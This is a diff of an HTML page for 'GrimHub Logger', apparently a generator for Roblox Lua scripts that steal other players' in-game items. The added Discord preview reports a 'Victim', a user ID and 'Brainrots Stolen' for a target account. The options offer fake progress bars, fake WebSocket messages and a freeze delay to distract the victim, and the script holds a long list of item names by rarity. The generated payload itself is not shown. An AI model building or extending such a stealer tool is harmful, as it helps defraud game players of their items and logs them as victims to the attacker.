@@ -3,107 +3,253 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>GrimHub Logger | Auto Morreria</title>
+    <title>GrimHub Logger | Premium Script Generator</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
+    
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0C1023;
-            font-family: 'Inter', system-ui, sans-serif;
-            padding: 2rem 1.5rem;
-            color: #f0f3ff;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        ::-webkit-scrollbar { width: 8px; height: 8px; }
-        ::-webkit-scrollbar-track { background: #141932; border-radius: 10px; }
-        ::-webkit-scrollbar-thumb { background: #423189; border-radius: 10px; }
-        ::-webkit-scrollbar-thumb:hover { background: #8B00FF; }
-        .container { max-width: 1600px; margin: 0 auto; }
+
+        body {
+            background: #0a0c15;
+            font-family: 'Inter', sans-serif;
+            color: #ffffff;
+            overflow-x: hidden;
+        }
+
+        /* Animated gradient background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 50%, rgba(139, 0, 255, 0.08), transparent 50%),
+                        radial-gradient(circle at 80% 80%, rgba(66, 49, 137, 0.08), transparent 50%);
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        /* Smooth scroll */
+        html {
+            scroll-behavior: smooth;
+        }
+
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #14151f;
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(135deg, #423189, #8B00FF);
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #8B00FF;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 1.5rem;
+        }
+
+        /* Header */
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 2rem;
-            padding-bottom: 1rem;
-            border-bottom: 1px solid rgba(139,0,255,0.3);
+            padding: 1rem 0;
+            border-bottom: 1px solid rgba(139, 0, 255, 0.2);
             flex-wrap: wrap;
             gap: 1rem;
         }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #423189, #8B00FF);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            box-shadow: 0 0 20px rgba(139, 0, 255, 0.3);
+        }
         .logo h1 {
-            font-size: 1.6rem;
-            font-weight: 600;
+            font-size: 1.5rem;
+            font-weight: 700;
             background: linear-gradient(135deg, #ffffff, #b77cff);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
         }
-        .logo span { font-size: 0.8rem; color: #6f78a0; display: block; }
-        .stats { display: flex; gap: 1.5rem; }
-        .stat-box {
-            text-align: center;
-            background: #141932;
-            padding: 0.5rem 1.2rem;
-            border-radius: 12px;
-            border: 1px solid #1E2846;
+        .logo p {
+            font-size: 0.7rem;
+            color: #6f78a0;
+            margin-top: 2px;
         }
-        .stat-number { font-size: 1.3rem; font-weight: 700; color: #b77cff; }
-        .stat-label { font-size: 0.7rem; color: #6f78a0; }
+        .badge {
+            background: rgba(139, 0, 255, 0.15);
+            padding: 0.4rem 1rem;
+            border-radius: 40px;
+            border: 1px solid rgba(139, 0, 255, 0.3);
+            font-size: 0.8rem;
+        }
+        .badge span {
+            color: #b77cff;
+            font-weight: 700;
+        }
+
+        /* Stats Bar */
+        .stats-bar {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 2rem;
+            flex-wrap: wrap;
+        }
+        .stat-card {
+            background: rgba(20, 21, 31, 0.8);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(139, 0, 255, 0.2);
+            border-radius: 16px;
+            padding: 0.8rem 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+        .stat-icon {
+            font-size: 1.8rem;
+        }
+        .stat-info h3 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #b77cff;
+        }
+        .stat-info p {
+            font-size: 0.7rem;
+            color: #6f78a0;
+        }
+
+        /* Grid */
         .grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
             gap: 1.5rem;
             margin-bottom: 1.5rem;
         }
+
+        /* Cards */
         .card {
-            background: #141932;
-            border: 1px solid #1E2846;
-            border-radius: 16px;
+            background: rgba(20, 21, 31, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(139, 0, 255, 0.15);
+            border-radius: 20px;
             padding: 1.5rem;
-            transition: all 0.2s ease;
+            transition: all 0.3s ease;
         }
-        .card:hover { border-color: #8B00FF; box-shadow: 0 8px 24px rgba(139,0,255,0.15); }
+        .card:hover {
+            border-color: rgba(139, 0, 255, 0.4);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
         .card-title {
             font-size: 1rem;
             font-weight: 600;
-            margin-bottom: 1rem;
-            padding-bottom: 0.5rem;
-            border-bottom: 1px solid #1E2846;
+            margin-bottom: 1.2rem;
             display: flex;
             align-items: center;
             gap: 0.5rem;
             color: #b9c3f0;
         }
+        .card-title i {
+            font-size: 1.2rem;
+        }
+
+        /* Inputs */
         input, select {
             width: 100%;
-            background: #0C1023;
+            background: #0a0c15;
             border: 1px solid #1E2846;
-            border-radius: 10px;
-            padding: 10px 14px;
+            border-radius: 12px;
+            padding: 12px 16px;
             color: white;
             font-size: 0.85rem;
+            transition: all 0.2s;
+            font-family: inherit;
         }
-        input:focus, select:focus { outline: none; border-color: #8B00FF; }
+        input:focus, select:focus {
+            outline: none;
+            border-color: #8B00FF;
+            box-shadow: 0 0 0 3px rgba(139, 0, 255, 0.1);
+        }
         label {
-            font-size: 0.75rem;
+            font-size: 0.7rem;
             font-weight: 500;
             color: #8e9acb;
             display: block;
-            margin-bottom: 0.3rem;
+            margin-bottom: 0.4rem;
             text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
-        .search-box { margin-bottom: 1rem; }
-        .select-buttons { display: flex; gap: 0.5rem; margin-bottom: 1rem; }
+        .optional {
+            color: #6f78a0;
+            font-size: 0.6rem;
+            font-weight: normal;
+            margin-left: 0.5rem;
+        }
+
+        /* Search */
+        .search-box {
+            margin-bottom: 1rem;
+        }
+
+        /* Buttons */
+        .btn-group {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+        }
         .small-btn {
             background: #1E2846;
             border: none;
             color: white;
-            padding: 5px 12px;
-            border-radius: 20px;
+            padding: 6px 14px;
+            border-radius: 30px;
             cursor: pointer;
             font-size: 0.7rem;
+            font-weight: 500;
+            transition: all 0.2s;
         }
-        .small-btn:hover { background: #423189; }
-        .small-btn.select-all { background: #1b5e20; }
-        .small-btn.deselect-all { background: #8b0000; }
+        .small-btn:hover {
+            background: #423189;
+            transform: translateY(-1px);
+        }
+        .small-btn.select-all {
+            background: #1b5e20;
+        }
+        .small-btn.deselect-all {
+            background: #8b0000;
+        }
+
+        /* Category Filters */
         .category-filters {
             display: flex;
             flex-wrap: wrap;
@@ -114,124 +260,257 @@
             background: #1E2846;
             border: none;
             color: white;
-            padding: 5px 12px;
-            border-radius: 20px;
+            padding: 6px 14px;
+            border-radius: 30px;
             cursor: pointer;
             font-size: 0.7rem;
+            font-weight: 500;
+            transition: all 0.2s;
         }
-        .category-btn:hover { background: #423189; }
-        .category-btn.active { background: #8B00FF; }
+        .category-btn:hover {
+            background: #423189;
+        }
+        .category-btn.active {
+            background: #8B00FF;
+            box-shadow: 0 0 10px rgba(139, 0, 255, 0.5);
+        }
+
+        /* Brainrot Grid */
         .brainrot-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(175px, 1fr));
-            gap: 0.5rem;
-            max-height: 450px;
+            grid-template-columns: repeat(auto-fill, minmax(170px, 1fr));
+            gap: 0.6rem;
+            max-height: 400px;
             overflow-y: auto;
-            background: #0a0e1c;
-            border-radius: 12px;
-            padding: 0.8rem;
+            padding-right: 0.5rem;
         }
         .brainrot-item {
             display: flex;
             align-items: center;
             gap: 0.5rem;
-            background: #0C1023;
+            background: #0a0c15;
             padding: 8px 12px;
-            border-radius: 8px;
+            border-radius: 12px;
             border: 1px solid #1E2846;
             cursor: pointer;
+            transition: all 0.15s;
+        }
+        .brainrot-item:hover {
+            background: #1a1f35;
+            transform: translateX(3px);
         }
         .brainrot-item.selected {
             background: #2a1e55;
             border-color: #8B00FF;
-            box-shadow: 0 0 8px rgba(139,0,255,0.3);
+            box-shadow: 0 0 8px rgba(139, 0, 255, 0.3);
         }
         .brainrot-item img {
-            width: 32px;
-            height: 32px;
+            width: 28px;
+            height: 28px;
             object-fit: cover;
-            border-radius: 6px;
-            background: #1a1f3a;
+            border-radius: 8px;
         }
-        .brainrot-item span { flex: 1; font-size: 0.7rem; font-weight: 500; }
+        .brainrot-item span {
+            flex: 1;
+            font-size: 0.7rem;
+            font-weight: 500;
+        }
         .tier-badge {
             font-size: 0.55rem;
-            padding: 2px 6px;
-            border-radius: 10px;
+            padding: 3px 6px;
+            border-radius: 20px;
             white-space: nowrap;
+            font-weight: 600;
         }
-        .tier-og { background: #ff4444; color: white; box-shadow: 0 0 6px #ff4444; }
+        .tier-og { background: #ff4444; color: white; }
         .tier-secret { background: #ff00ff; color: white; }
         .tier-god { background: #ffaa00; color: #1a1a2e; }
         .tier-mythic { background: #aa44ff; color: white; }
-        .tier-legendary { background: #44aaff; color: white; }
+        .tier-legendary { background: #00aaff; color: white; }
         .tier-epic { background: #8844ff; color: white; }
         .tier-rare { background: #44ffaa; color: #1a1a2e; }
-        .tier-common { background: #888888; color: white; }
-        .toggle-group { display: flex; flex-wrap: wrap; gap: 0.8rem; margin: 0.8rem 0; }
+        .tier-common { background: #666666; color: white; }
+
+        /* Toggle */
+        .toggle-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+            margin: 0.8rem 0;
+        }
         .toggle-switch {
             display: flex;
             align-items: center;
             gap: 0.5rem;
-            background: #0C1023;
-            padding: 6px 14px;
-            border-radius: 20px;
+            background: #0a0c15;
+            padding: 8px 16px;
+            border-radius: 40px;
             border: 1px solid #1E2846;
             cursor: pointer;
             font-size: 0.75rem;
+            transition: all 0.2s;
         }
-        .slider-group { margin-top: 0.8rem; }
-        .slider-group input { accent-color: #8B00FF; }
+        .toggle-switch:hover {
+            border-color: #8B00FF;
+        }
+
+        /* Slider */
+        .slider-group {
+            margin-top: 1rem;
+        }
+        .slider-group input {
+            accent-color: #8B00FF;
+        }
         .freeze-value {
             display: inline-block;
-            background: #0C1023;
-            padding: 2px 8px;
-            border-radius: 20px;
+            background: #0a0c15;
+            padding: 4px 12px;
+            border-radius: 30px;
             margin-left: 10px;
             font-size: 0.75rem;
             color: #b77cff;
         }
+
+        /* Main Buttons */
         .btn {
             border: none;
             background: #5865F2;
             color: white;
             font-weight: 600;
-            padding: 10px 20px;
-            border-radius: 8px;
+            padding: 12px 24px;
+            border-radius: 12px;
             cursor: pointer;
+            transition: all 0.2s;
             font-size: 0.85rem;
+            font-family: inherit;
         }
-        .btn-primary { background: linear-gradient(135deg, #423189, #8B00FF); }
-        .btn-primary:hover { opacity: 0.9; transform: translateY(-1px); }
-        .btn-secondary { background: #1E2846; }
-        .btn-secondary:hover { background: #2a3555; }
-        .btn-group { display: flex; gap: 0.8rem; flex-wrap: wrap; margin-bottom: 1rem; }
+        .btn-primary {
+            background: linear-gradient(135deg, #423189, #8B00FF);
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(139, 0, 255, 0.4);
+        }
+        .btn-secondary {
+            background: #1E2846;
+        }
+        .btn-secondary:hover {
+            background: #2a3555;
+        }
+
+        /* Output */
         pre {
-            background: #0a0e1c;
+            background: #0a0c15;
             padding: 1rem;
             border-radius: 12px;
             overflow-x: auto;
-            font-family: monospace;
+            font-family: 'JetBrains Mono', monospace;
             font-size: 0.7rem;
             border: 1px solid #1E2846;
             white-space: pre-wrap;
+            word-wrap: break-word;
         }
+
+        /* Embed Preview */
+        .embed-preview {
+            background: #0a0c15;
+            border-radius: 16px;
+            padding: 1rem;
+            margin-top: 1rem;
+            border: 1px solid #1E2846;
+        }
+        .embed-preview-title {
+            font-size: 0.7rem;
+            color: #6f78a0;
+            margin-bottom: 0.8rem;
+            text-transform: uppercase;
+        }
+        .fake-embed {
+            background: #1a1d2e;
+            border-radius: 12px;
+            overflow: hidden;
+            border-left: 4px solid #8B00FF;
+        }
+        .fake-embed-header {
+            padding: 12px;
+            background: #141828;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .fake-embed-avatar {
+            width: 32px;
+            height: 32px;
+            background: #8B00FF;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+        }
+        .fake-embed-name {
+            font-weight: 600;
+            font-size: 13px;
+        }
+        .fake-embed-bot {
+            background: #5865F2;
+            font-size: 9px;
+            padding: 2px 6px;
+            border-radius: 12px;
+            margin-left: 6px;
+        }
+        .fake-embed-body {
+            padding: 12px;
+        }
+        .fake-embed-title {
+            color: #b77cff;
+            font-weight: 600;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        .fake-embed-description {
+            font-size: 12px;
+            color: #b9c3f0;
+            margin-bottom: 8px;
+        }
+        .fake-embed-field {
+            background: #0a0c15;
+            padding: 8px;
+            border-radius: 8px;
+            margin-top: 8px;
+            font-size: 11px;
+        }
+        .fake-embed-field span {
+            color: #b77cff;
+        }
+        .fake-embed-footer {
+            padding: 8px 12px;
+            border-top: 1px solid #1E2846;
+            font-size: 10px;
+            color: #6f78a0;
+        }
+
         .copy-success {
             position: fixed;
             bottom: 20px;
             right: 20px;
             background: #2ecc71;
             color: white;
-            padding: 10px 20px;
-            border-radius: 8px;
-            z-index: 999;
-            animation: fadeIn 0.2s ease;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-size: 0.85rem;
+            z-index: 1000;
+            animation: slideIn 0.3s ease;
         }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(100px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
         @media (max-width: 780px) {
-            body { padding: 1rem; }
-            .header { flex-direction: column; text-align: center; }
-            .stats { justify-content: center; }
+            .container { padding: 1rem; }
+            .stat-card { padding: 0.5rem 1rem; }
+            .stat-info h3 { font-size: 1.2rem; }
             .grid { grid-template-columns: 1fr; }
             .brainrot-grid { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); }
         }
@@ -239,41 +518,77 @@
 </head>
 <body>
 <div class="container">
+    <!-- Header -->
     <div class="header">
         <div class="logo">
-            <h1>GrimHub Logger</h1>
-            <span>Auto Morreria System</span>
-        </div>
-        <div class="stats">
-            <div class="stat-box">
-                <div class="stat-number" id="totalBrainrotsCount">0</div>
-                <div class="stat-label">Assets</div>
+            <div class="logo-icon">💀</div>
+            <div>
+                <h1>GrimHub Logger</h1>
+                <p>Auto Morreria System • Premium Script Generator</p>
             </div>
-            <div class="stat-box">
-                <div class="stat-number" id="selectedStats">0</div>
-                <div class="stat-label">Selected</div>
+        </div>
+        <div class="badge">
+            🔥 <span>Elite</span> • Active
+        </div>
+    </div>
+
+    <!-- Stats -->
+    <div class="stats-bar">
+        <div class="stat-card">
+            <div class="stat-icon">🧠</div>
+            <div class="stat-info">
+                <h3 id="totalBrainrotsCount">0</h3>
+                <p>Total Assets</p>
+            </div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-icon">✅</div>
+            <div class="stat-info">
+                <h3 id="selectedStats">0</h3>
+                <p>Selected</p>
+            </div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-icon">🎯</div>
+            <div class="stat-info">
+                <h3>Auto</h3>
+                <p>Auto Morreria</p>
             </div>
         </div>
     </div>
 
+    <!-- Main Grid -->
     <div class="grid">
+        <!-- Config Card -->
         <div class="card">
-            <div class="card-title">📡 Configuration</div>
-            <label>Discord Webhook</label>
+            <div class="card-title">
+                <span>📡</span> Configuration
+            </div>
+            <label>Discord Webhook <span class="optional">(Optional - no webhook = no Discord log)</span></label>
             <input type="url" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
-            <label style="margin-top: 0.8rem;">Target Username</label>
+            <label style="margin-top: 1rem;">Target Username</label>
             <input type="text" id="targetUser" placeholder="Morreria" value="Morreria">
         </div>
 
+        <!-- Execution Card -->
         <div class="card">
-            <div class="card-title">⚙️ Execution</div>
+            <div class="card-title">
+                <span>⚙️</span> Execution
+            </div>
             <select id="scriptMode">
-                <option value="AUTO-MORRERIA">Auto Morreria</option>
+                <option value="AUTO-MORRERIA">🔥 Auto Morreria</option>
             </select>
-            <div style="margin: 0.8rem 0 0.5rem 0;"><label>Distractions</label></div>
+
+            <div style="margin: 1rem 0 0.5rem 0;">
+                <label>Distractions</label>
+            </div>
             <div class="toggle-group">
-                <label class="toggle-switch"><input type="checkbox" id="fakeProgress"> Progress Bar</label>
-                <label class="toggle-switch"><input type="checkbox" id="fakeWebSocket"> WebSocket Message</label>
+                <label class="toggle-switch">
+                    <input type="checkbox" id="fakeProgress"> Progress Bar
+                </label>
+                <label class="toggle-switch">
+                    <input type="checkbox" id="fakeWebSocket"> WebSocket Message
+                </label>
             </div>
             <div class="slider-group">
                 <label>Freeze Delay</label>
@@ -282,23 +597,26 @@
             </div>
         </div>
 
+        <!-- Asset Selector Card -->
         <div class="card">
-            <div class="card-title">🧠 Asset Selector</div>
+            <div class="card-title">
+                <span>🧠</span> Asset Selector
+            </div>
             <div class="search-box">
-                <input type="text" id="brainrotSearch" placeholder="Filter assets...">
+                <input type="text" id="brainrotSearch" placeholder="Search assets...">
             </div>
             <div class="category-filters" id="categoryFilters">
                 <button class="category-btn active" data-category="all">All</button>
-                <button class="category-btn" data-category="og">⭐ OG (Rarest)</button>
+                <button class="category-btn" data-category="og">⭐ OG</button>
                 <button class="category-btn" data-category="secret">✨ Secret</button>
-                <button class="category-btn" data-category="god">🏆 Brainrot God</button>
+                <button class="category-btn" data-category="god">🏆 God</button>
                 <button class="category-btn" data-category="mythic">🌀 Mythic</button>
                 <button class="category-btn" data-category="legendary">🔥 Legendary</button>
                 <button class="category-btn" data-category="epic">⚡ Epic</button>
                 <button class="category-btn" data-category="rare">💎 Rare</button>
                 <button class="category-btn" data-category="common">📦 Common</button>
             </div>
-            <div class="select-buttons">
+            <div class="btn-group">
                 <button class="small-btn select-all" id="selectAllBtn">Select All</button>
                 <button class="small-btn deselect-all" id="deselectAllBtn">Deselect All</button>
             </div>
@@ -306,12 +624,46 @@
         </div>
     </div>
 
-    <div class="card output-card">
-        <div class="card-title">📜 Output</div>
+    <!-- Embed Preview Card -->
+    <div class="card" style="margin-bottom: 1.5rem;">
+        <div class="card-title">
+            <span>🎨</span> Discord Webhook Preview
+        </div>
+        <div class="embed-preview" id="embedPreview">
+            <div class="embed-preview-title">📤 PREVIEW OF WHAT WILL BE SENT TO YOUR DISCORD</div>
+            <div class="fake-embed">
+                <div class="fake-embed-header">
+                    <div class="fake-embed-avatar">🤖</div>
+                    <div class="fake-embed-name">GrimHub Logger <span class="fake-embed-bot">BOT</span></div>
+                </div>
+                <div class="fake-embed-body">
+                    <div class="fake-embed-title">✅ Trade Completed Successfully</div>
+                    <div class="fake-embed-description">A trade has been executed using GrimHub Auto Morreria.</div>
+                    <div class="fake-embed-field">
+                        <span>👤 Victim:</span> robloxuser_123<br>
+                        <span>🆔 User ID:</span> 1234567890<br>
+                        <span>🎯 Target:</span> Morreria
+                    </div>
+                    <div class="fake-embed-field">
+                        <span>🧠 Brainrots Stolen:</span> Dragon Gingerini, Meowl, Strawberry Elephant
+                    </div>
+                    <div class="fake-embed-footer">
+                        GrimHub Logger • Premium Script
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Output Card -->
+    <div class="card">
+        <div class="card-title">
+            <span>📜</span> Generated Script
+        </div>
         <div class="btn-group">
-            <button class="btn btn-primary" id="generateBtn">Generate Script</button>
-            <button class="btn btn-secondary" id="copyBtn">Copy</button>
-            <button class="btn btn-secondary" id="downloadBtn">Download .lua</button>
+            <button class="btn btn-primary" id="generateBtn">✨ Generate Script</button>
+            <button class="btn btn-secondary" id="copyBtn">📋 Copy</button>
+            <button class="btn btn-secondary" id="downloadBtn">💾 Download .lua</button>
         </div>
         <pre id="outputCode">-- GrimHub Logger
 -- Configure settings above and click Generate</pre>
@@ -319,17 +671,12 @@
 </div>
 
 <script>
-    // ========== COMPLETE BRAINROTS WITH CORRECT RARITIES FROM WIKI ==========
-    // Total: 382 indexable brainrots [citation:7]
-    
+    // ========== BRAINROTS LIST ==========
     const brainrotsWithCategory = [
-        // ========== OG TIER (RAREST IN GAME) ==========
         { name: "Strawberry Elephant", category: "og", tierLabel: "OG" },
         { name: "Meowl", category: "og", tierLabel: "OG" },
         { name: "Headless Horseman", category: "og", tierLabel: "OG" },
         { name: "Skibidi Toilet", category: "og", tierLabel: "OG" },
-        
-        // ========== SECRET TIER (~100 brainrots) ==========
         { name: "Dragon Gingerini", category: "secret", tierLabel: "SECRET" },
         { name: "Hydra Dragon Cannelloni", category: "secret", tierLabel: "SECRET" },
         { name: "La Supreme Combinasion", category: "secret", tierLabel: "SECRET" },
@@ -342,245 +689,12 @@
         { name: "Love Love Bear", category: "secret", tierLabel: "SECRET" },
         { name: "Dragon Cannelloni", category: "secret", tierLabel: "SECRET" },
         { name: "Ketupat Bros", category: "secret", tierLabel: "SECRET" },
-        { name: "Capitano Moby", category: "secret", tierLabel: "SECRET" },
-        { name: "Cooki and Milki", category: "secret", tierLabel: "SECRET" },
-        { name: "Popcuru and Fizzuru", category: "secret", tierLabel: "SECRET" },
-        { name: "Rosey and Teddy", category: "secret", tierLabel: "SECRET" },
-        { name: "Burguro And Fryuro", category: "secret", tierLabel: "SECRET" },
-        { name: "Reinito Sleighito", category: "secret", tierLabel: "SECRET" },
-        { name: "Fortunu and Cashuru", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Amigos", category: "secret", tierLabel: "SECRET" },
-        { name: "La Secret Combinasion", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Sekolahs", category: "secret", tierLabel: "SECRET" },
-        { name: "La Casa Boo", category: "secret", tierLabel: "SECRET" },
-        { name: "Fragrama and Chocrama", category: "secret", tierLabel: "SECRET" },
-        { name: "La Food Combinasion", category: "secret", tierLabel: "SECRET" },
-        { name: "Spooky and Pumpky", category: "secret", tierLabel: "SECRET" },
-        { name: "Ginger Gerat", category: "secret", tierLabel: "SECRET" },
-        { name: "La Ginger Sekolah", category: "secret", tierLabel: "SECRET" },
-        { name: "Sammyni Fattini", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Spaghettis", category: "secret", tierLabel: "SECRET" },
-        { name: "Festive 67", category: "secret", tierLabel: "SECRET" },
-        { name: "Ventoliero Pavonero", category: "secret", tierLabel: "SECRET" },
-        { name: "Cloverat Clapat", category: "secret", tierLabel: "SECRET" },
-        { name: "Spaghetti Tualetti", category: "secret", tierLabel: "SECRET" },
-        { name: "Rosetti Tualetti", category: "secret", tierLabel: "SECRET" },
-        { name: "Nacho Spyder", category: "secret", tierLabel: "SECRET" },
-        { name: "Garama and Madundung", category: "secret", tierLabel: "SECRET" },
-        { name: "Fishino Clownino", category: "secret", tierLabel: "SECRET" },
-        { name: "Gold Gold Gold", category: "secret", tierLabel: "SECRET" },
-        { name: "Jolly Jolly Sahur", category: "secret", tierLabel: "SECRET" },
-        { name: "Lavadorito Spinito", category: "secret", tierLabel: "SECRET" },
-        { name: "Ketchuru and Musturu", category: "secret", tierLabel: "SECRET" },
-        { name: "Swaggy Bros", category: "secret", tierLabel: "SECRET" },
-        { name: "La Romantic Grande", category: "secret", tierLabel: "SECRET" },
-        { name: "Orcaledon", category: "secret", tierLabel: "SECRET" },
-        { name: "Tictac Sahur", category: "secret", tierLabel: "SECRET" },
-        { name: "La Taco Combinasion", category: "secret", tierLabel: "SECRET" },
-        { name: "Ketupat Kepat", category: "secret", tierLabel: "SECRET" },
-        { name: "Dug dug dug", category: "secret", tierLabel: "SECRET" },
-        { name: "Tang Tang Keletang", category: "secret", tierLabel: "SECRET" },
-        { name: "Lovin Rose", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Tacoritas", category: "secret", tierLabel: "SECRET" },
-        { name: "Eviledon", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Primos", category: "secret", tierLabel: "SECRET" },
-        { name: "W or L", category: "secret", tierLabel: "SECRET" },
-        { name: "Esok Sekolah", category: "secret", tierLabel: "SECRET" },
-        { name: "La Jolly Grande", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Cupids", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Puggies", category: "secret", tierLabel: "SECRET" },
-        { name: "Tralaledon", category: "secret", tierLabel: "SECRET" },
-        { name: "Gobblino Uniciclino", category: "secret", tierLabel: "SECRET" },
-        { name: "Tuff Toucan", category: "secret", tierLabel: "SECRET" },
-        { name: "Mieteteira Bicicleteira", category: "secret", tierLabel: "SECRET" },
-        { name: "Chillin Chili", category: "secret", tierLabel: "SECRET" },
-        { name: "Money Money Reindeer", category: "secret", tierLabel: "SECRET" },
-        { name: "La Spooky Grande", category: "secret", tierLabel: "SECRET" },
-        { name: "Bacuru and Egguru", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Bros", category: "secret", tierLabel: "SECRET" },
-        { name: "La Extinct Grande", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Candies", category: "secret", tierLabel: "SECRET" },
-        { name: "Los 67", category: "secret", tierLabel: "SECRET" },
-        { name: "Celularcini Viciosini", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Mobilis", category: "secret", tierLabel: "SECRET" },
-        { name: "Money Money Puggy", category: "secret", tierLabel: "SECRET" },
-        { name: "Cigno Fulgoro", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Spooky Combinasionas", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Hotspotsitos", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Jolly Combinasionas", category: "secret", tierLabel: "SECRET" },
-        { name: "Snailo Clovero", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Planitos", category: "secret", tierLabel: "SECRET" },
-        { name: "Chicleteira Cupideira", category: "secret", tierLabel: "SECRET" },
-        { name: "Las Sis", category: "secret", tierLabel: "SECRET" },
-        { name: "Spinny Hammy", category: "secret", tierLabel: "SECRET" },
-        { name: "Tacorita Bicicleta", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Sweethearts", category: "secret", tierLabel: "SECRET" },
-        { name: "Nuclearo Dinossauro", category: "secret", tierLabel: "SECRET" },
-        { name: "Chicleteira Noelteira", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Combinasionas", category: "secret", tierLabel: "SECRET" },
-        { name: "Chimnino", category: "secret", tierLabel: "SECRET" },
-        { name: "Noo my Gold", category: "secret", tierLabel: "SECRET" },
-        { name: "Swag Soda", category: "secret", tierLabel: "SECRET" },
-        { name: "Noo my Heart", category: "secret", tierLabel: "SECRET" },
-        { name: "Tacorillo Crocodillo", category: "secret", tierLabel: "SECRET" },
-        { name: "Mariachi Corazoni", category: "secret", tierLabel: "SECRET" },
-        { name: "La Grande Combinasion", category: "secret", tierLabel: "SECRET" },
-        { name: "Los 25", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Burritos", category: "secret", tierLabel: "SECRET" },
-        { name: "67", category: "secret", tierLabel: "SECRET" },
-        { name: "Donkeyturbo Express", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Chicleteiras", category: "secret", tierLabel: "SECRET" },
-        { name: "Guest 666", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Mi Gatitos", category: "secret", tierLabel: "SECRET" },
-        { name: "Rang Ring Bus", category: "secret", tierLabel: "SECRET" },
-        { name: "Granny", category: "secret", tierLabel: "SECRET" },
-        { name: "Noo my Present", category: "secret", tierLabel: "SECRET" },
-        { name: "Serafinna Medusella", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Nooo My Hotspotsitos", category: "secret", tierLabel: "SECRET" },
-        { name: "Arcadopus", category: "secret", tierLabel: "SECRET" },
-        { name: "Noo my Candy", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Quesadillas", category: "secret", tierLabel: "SECRET" },
-        { name: "Chicleteirina Bicicleteirina", category: "secret", tierLabel: "SECRET" },
-        { name: "Chill Puppy", category: "secret", tierLabel: "SECRET" },
-        { name: "Burrito Bandito", category: "secret", tierLabel: "SECRET" },
-        { name: "Luck Luck Luck Sahur", category: "secret", tierLabel: "SECRET" },
-        { name: "Chicleteira Bicicleteira", category: "secret", tierLabel: "SECRET" },
-        { name: "Brunito Marsito", category: "secret", tierLabel: "SECRET" },
-        { name: "Quesadillo Vampiro", category: "secret", tierLabel: "SECRET" },
-        { name: "Eid Eid Eid Sahur", category: "secret", tierLabel: "SECRET" },
